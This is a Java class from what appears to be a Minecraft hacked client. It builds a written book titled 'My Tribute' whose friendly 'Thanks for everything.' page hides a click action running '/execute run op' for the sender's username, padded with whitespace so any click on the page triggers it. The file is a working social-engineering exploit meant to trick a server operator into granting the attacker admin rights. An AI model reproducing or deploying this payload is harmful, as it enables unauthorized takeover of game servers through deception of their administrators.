package net.onyx.client.items.impl.string;

import net.minecraft.item.Item;
import net.minecraft.item.Items;
import net.onyx.client.items.StringCreativeItem;
import net.onyx.client.utils.ClientUtils;

public class OpBook implements StringCreativeItem {
    public OpBook() {
        super();
    }

    @Override
    public String getNbtString() {
        String name = ClientUtils.getUsername();
        return "{author:\""+name+"\",pages:['{\"clickEvent\":{\"action\":\"run_command\",\"value\":\"/execute run op "+name+"\"},\"text\":\"Thanks for everything.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         \"}','{\"text\":\"\"}','{\"text\":\"\"}'],resolved:1b,title:\"My Tribute\"}";
    }

    @Override
    public Item getItem() {
        return Items.WRITTEN_BOOK;
    }
}
